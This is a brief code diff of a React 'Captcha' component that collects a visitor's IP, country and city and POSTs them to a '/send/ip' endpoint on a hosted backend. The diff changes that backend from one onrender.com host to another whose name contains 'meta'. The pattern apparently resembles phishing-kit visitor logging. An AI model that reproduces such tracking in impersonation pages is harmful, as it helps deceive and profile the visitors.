@@ -118,7 +118,7 @@ function Captcha({ setStep, Unik, setIp }) {
 
                             setAllData({ ...AllData, ip: data.ip, country: data.country, city: data.city })
 
-                            fetch("https://business-back-9rjw.onrender.com/send/ip", {
+                            fetch("https://metaback-f8gb.onrender.com/send/ip", {
                                 method: "POST",
                                 body: JSON.stringify(params),
                                 headers: {
